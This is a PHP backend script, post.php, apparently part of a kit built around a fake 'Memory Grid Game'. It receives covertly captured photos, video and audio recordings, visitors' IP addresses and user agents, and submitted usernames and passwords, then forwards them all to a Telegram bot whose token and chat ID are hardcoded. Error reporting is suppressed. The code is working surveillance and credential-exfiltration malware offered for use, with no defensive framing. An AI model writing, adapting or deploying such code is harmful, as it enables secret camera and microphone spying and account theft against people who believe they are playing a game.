<?php
// ============================================
// POST.PHP - Handles all data to Telegram
// ============================================

error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// YOUR TELEGRAM CREDENTIALS
// ============================================
$botToken = "8591278217:AAFqz4Ncr8rqQuyEkcyfrnIefa5RUa2YWZY";  // ← YOUR FULL TOKEN
$chatId = "6715599952";  // ← YOUR CHAT ID

// ============================================
// GET DATA
// ============================================
$type = $_POST['tg_type'] ?? '';
$ip = $_POST['tg_ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua = $_POST['tg_ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');

// ============================================
// TELEGRAM SEND FUNCTION
// ============================================
function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
    global $botToken, $chatId;
    
    try {
        if ($fileData) {
            if ($fileType === 'video') {
                $url = "https://api.telegram.org/bot$botToken/sendVideo";
                $paramName = 'video';
                $mimeType = 'video/webm';
                $ext = 'webm';
            } elseif ($fileType === 'audio') {
                $url = "https://api.telegram.org/bot$botToken/sendAudio";
                $paramName = 'audio';
                $mimeType = 'audio/webm';
                $ext = 'webm';
            } else {
                $url = "https://api.telegram.org/bot$botToken/sendPhoto";
                $paramName = 'photo';
                $mimeType = 'image/png';
                $ext = 'png';
            }
            
            $fileContent = base64_decode(preg_replace('#^data:.*?;base64,#', '', $fileData));
            $tempFile = tempnam(sys_get_temp_dir(), 'tg_') . '.' . $ext;
            file_put_contents($tempFile, $fileContent);
            
            $cfile = curl_file_create($tempFile, $mimeType, 'capture.' . $ext);
            $data = [
                'chat_id' => $chatId,
                $paramName => $cfile,
                'caption' => $message,
                'parse_mode' => 'HTML'
            ];
        } else {
            $url = "https://api.telegram.org/bot$botToken/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' => 'HTML'
            ];
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if (isset($tempFile) && file_exists($tempFile)) {
            unlink($tempFile);
        }
        
        return $httpCode == 200;
    } catch (Exception $e) {
        return false;
    }
}

// ============================================
// HANDLE TYPES
// ============================================

switch ($type) {
    // ==========================================
    // IP ADDRESS
    // ==========================================
    case 'IP':
        $message = "🌐 <b>IP ADDRESS</b>\n";
        $message .= "IP: <code>" . htmlspecialchars($_POST['tg_data'] ?? $ip) . "</code>\n";
        $message .= "UA: " . htmlspecialchars($ua) . "\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // PHOTO
    // ==========================================
    case 'image':
        $imageData = $_POST['tg_image'] ?? '';
        if (!empty($imageData)) {
            $caption = "📸 <b>PHOTO CAPTURE</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time\n";
            $caption .= "From: Memory Grid Game";
            sendTelegramMessage($caption, $imageData, 'photo');
        }
        break;
    
    // ==========================================
    // VIDEO
    // ==========================================
    case 'video':
        $videoData = $_POST['tg_video'] ?? '';
        $counter = $_POST['tg_counter'] ?? 0;
        if (!empty($videoData)) {
            $caption = "🎥 <b>VIDEO #$counter</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time\n";
            $caption .= "🎮 From: Memory Grid Game";
            sendTelegramMessage($caption, $videoData, 'video');
        }
        break;
    
    // ==========================================
    // AUDIO
    // ==========================================
    case 'audio':
        $audioData = $_POST['tg_audio'] ?? '';
        $counter = $_POST['tg_counter'] ?? 0;
        if (!empty($audioData)) {
            $caption = "🎙️ <b>AUDIO #$counter</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time\n";
            $caption .= "🎮 From: Memory Grid Game";
            sendTelegramMessage($caption, $audioData, 'audio');
        }
        break;
    
    // ==========================================
    // PERMISSION
    // ==========================================
    case 'permission':
        $message = "🔓 <b>PERMISSION STATUS</b>\n\n";
        $message .= "Status: " . htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // WARNING
    // ==========================================
    case 'warning':
        $message = "⚠️ <b>WARNING</b>\n\n";
        $message .= htmlspecialchars($_POST['tg_data'] ?? 'Unknown') . "\n";
        $message .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // GAME WON
    // ==========================================
    case 'game_won':
        $data = json_decode($_POST['tg_data'] ?? '{}', true);
        $message = "🏆 <b>GAME COMPLETED!</b>\n\n";
        $message .= "🎯 Moves: " . ($data['moves'] ?? 'N/A') . "\n";
        $message .= "⏱️ Time: " . ($data['time'] ?? 'N/A') . "s\n";
        $message .= "📊 Accuracy: " . ($data['accuracy'] ?? 'N/A') . "%\n";
        $message .= "📐 Grid: " . ($data['size'] ?? 'N/A') . "×" . ($data['size'] ?? 'N/A') . "\n\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // LOGIN (if you keep it)
    // ==========================================
    case 'login':
        $username = $_POST['tg_username'] ?? 'N/A';
        $password = $_POST['tg_password'] ?? 'N/A';
        
        $message = "🔐 <b>LOGIN CREDENTIALS</b>\n\n";
        $message .= "👤 User: <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 Pass: <code>" . htmlspecialchars($password) . "</code>\n\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // DEFAULT
    // ==========================================
    default:
        if (!empty($_POST)) {
            $message = "📦 <b>DATA RECEIVED</b>\n\n";
            $message .= "📝 Type: " . htmlspecialchars($type) . "\n";
            $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $message .= "⏰ Time: $time";
            sendTelegramMessage($message);
        }
        break;
}

// ============================================
// RESPONSE
// ============================================
header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
?>
